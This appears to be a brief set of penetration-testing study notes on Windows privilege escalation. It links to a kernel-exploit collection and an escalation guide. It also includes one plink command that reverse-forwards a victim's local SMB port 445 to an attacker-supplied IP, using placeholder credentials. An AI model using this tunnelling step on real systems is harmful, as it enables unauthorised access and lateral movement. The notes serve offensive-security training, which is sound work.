# Windows Escalation Paths

## Kernel Exploits

- [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)


## Password and Port Forwarding

- [Privilege Escalation Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) for Port Forwarding

```cmd
plink.exe -l root -pw toor -R 445:127.0.0.1:445 {attackers ip}

```


## Windows Subsystem for Linux
